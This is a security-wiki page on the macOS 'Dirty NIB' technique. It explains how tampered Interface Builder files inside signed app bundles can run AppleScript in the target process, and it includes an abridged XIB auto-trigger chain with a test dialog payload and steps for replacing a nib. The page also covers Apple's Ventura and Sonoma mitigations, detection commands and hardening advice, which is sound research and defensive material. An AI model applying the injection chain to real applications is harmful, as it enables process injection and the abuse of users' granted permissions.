# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB refers to abusing Interface Builder files (.xib/.nib) inside a signed macOS app bundle to execute attacker-controlled logic inside the target process, thereby inheriting its entitlements and TCC permissions. This technique was originally documented by xpn (MDSec) and later generalized and significantly expanded by Sector7, who also covered Apple’s mitigations in macOS 13 Ventura and macOS 14 Sonoma. For background and deep dives, see the references at the end.

> TL;DR
> • Before macOS 13 Ventura: replacing a bundle’s MainMenu.nib (or another nib loaded at startup) could reliably achieve process injection and often privilege escalation.  
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, and the new TCC “App Management” permission largely prevent post‑launch nib tampering by unrelated apps. Attacks may still be feasible in niche cases (e.g., same‑developer tooling modifying own apps, or terminals granted App Management/Full Disk Access by the user).


## What are NIB/XIB files

Nib (short for NeXT Interface Builder) files are serialized UI object graphs used by AppKit apps. Modern Xcode stores editable XML .xib files which are compiled into .nib at build time. A typical app loads its main UI via `NSApplicationMain()` which reads the `NSMainNibFile` key from the app’s Info.plist and instantiates the object graph at runtime.

Key points that enable the attack:
- NIB loading instantiates arbitrary Objective‑C classes without requiring them to conform to NSSecureCoding (Apple’s nib loader falls back to `init`/`initWithFrame:` when `initWithCoder:` is not available).
- Cocoa Bindings can be abused to call methods as nibs are instantiated, including chained calls that require no user interaction.


## Dirty NIB injection process (attacker view)

The classic pre‑Ventura flow:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- Use bindings to set a menu item’s target/selector and then invoke the private `_corePerformAction` method so the action fires automatically when the nib loads. This removes the need for a user to click a button.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
  <customObject id="A1" customClass="NSAppleScript"/>
  <textField id="A2" title="display dialog \"PWND\""/>
  <!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
  <menuItem id="C1">
    <connections>
      <binding name="target" destination="A1"/>
      <binding name="selector" keyPath="initWithSource:"/>
      <binding name="Argument" destination="A2" keyPath="title"/>
    </connections>
  </menuItem>
  <!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
  <menuItem id="C2">
    <connections>
      <binding name="target" destination="A1"/>
      <binding name="selector" keyPath="executeAndReturnError:"/>
    </connections>
  </menuItem>
  <!-- Triggers that auto‑press the above menu items at load time -->
  <menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
  <menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
This achieves arbitrary AppleScript execution in the target process upon nib load. Advanced chains can:
- Instantiate arbitrary AppKit classes (e.g., `NSTask`) and call zero‑argument methods like `-launch`.
- Call arbitrary selectors with object arguments via the binding trick above.
- Load AppleScriptObjC.framework to bridge into Objective‑C and even call selected C APIs.
- On older systems that still include Python.framework, bridge into Python and then use `ctypes` to call arbitrary C functions (Sector7’s research).

3) Replace the app’s nib
- Copy target.app to a writable location, replace e.g., `Contents/Resources/MainMenu.nib` with the malicious nib, and run target.app. Pre‑Ventura, after a one‑time Gatekeeper assessment, subsequent launches only performed shallow signature checks, so non‑executable resources (like .nib) weren’t re‑validated.

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```


## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple introduced several systemic mitigations that dramatically reduce the viability of Dirty NIB in modern macOS:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
  - On first run of any app (quarantined or not), a deep signature check covers all bundle resources. Afterwards, the bundle becomes protected: only apps from the same developer (or explicitly allowed by the app) may modify its contents. Other apps require the new TCC “App Management” permission to write into another app’s bundle.
- Launch Constraints (macOS 13 Ventura)
  - System/Apple‑bundled apps can’t be copied elsewhere and launched; this kills the “copy to /tmp, patch, run” approach for OS apps.
- Improvements in macOS 14 Sonoma
  - Apple hardened App Management and fixed known bypasses (e.g., CVE‑2023‑40450) noted by Sector7. Python.framework was removed earlier (macOS 12.3), breaking some privilege‑escalation chains.
- Gatekeeper/Quarantine changes
  - For a broader discussion of Gatekeeper, provenance, and assessment changes that impacted this technique, see the page referenced below.

> Practical implication
> • On Ventura+ you generally cannot modify a third‑party app’s .nib unless your process has App Management or is signed by the same Team ID as the target (e.g., developer tooling).  
> • Granting App Management or Full Disk Access to shells/terminals effectively re‑opens this attack surface for anything that can execute code inside that terminal’s context.


### Addressing Launch Constraints

Launch Constraints block running many Apple apps from non‑default locations beginning with Ventura. If you were relying on pre‑Ventura workflows like copying an Apple app to a temp directory, modifying `MainMenu.nib`, and launching it, expect that to fail on >= 13.0.


## Enumerating targets and nibs (useful for research / legacy systems)

- Locate apps whose UI is nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
  'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
   then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Find candidate nib resources inside a bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Validate code signatures deeply (will fail if you tampered with resources and didn’t re‑sign):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```

> Note: On modern macOS you will also be blocked by bundle protection/TCC when trying to write into another app’s bundle without proper authorization.


## Detection and DFIR tips

- File integrity monitoring on bundle resources
  - Watch for mtime/ctime changes to `Contents/Resources/*.nib` and other non‑executable resources in installed apps.
- Unified logs and process behavior
  - Monitor for unexpected AppleScript execution inside GUI apps and for processes loading AppleScriptObjC or Python.framework. Example:
    ```bash
    log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
    ```
- Proactive assessments
  - Periodically run `codesign --verify --deep` across critical apps to ensure resources remain intact.
- Privilege context
  - Audit who/what has TCC “App Management” or Full Disk Access (especially terminals and management agents). Removing these from general‑purpose shells prevents trivially re‑enabling Dirty NIB‑style tampering.


## Defensive hardening (developers and defenders)

- Prefer programmatic UI or limit what’s instantiated from nibs. Avoid including powerful classes (e.g., `NSTask`) in nib graphs and avoid bindings that indirectly invoke selectors on arbitrary objects.
- Adopt the hardened runtime with Library Validation (already standard for modern apps). While this doesn’t stop nib injection by itself, it blocks easy native code loading and forces attackers into scripting‑only payloads.
- Do not request or depend on broad App Management permissions in general‑purpose tools. If MDM requires App Management, segregate that context from user‑driven shells.
- Regularly verify your app bundle’s integrity and make your update mechanisms self‑heal bundle resources.


## Related reading in HackTricks

Learn more about Gatekeeper, quarantine and provenance changes that affect this technique:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- xpn – DirtyNIB (original write‑up with Pages example): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
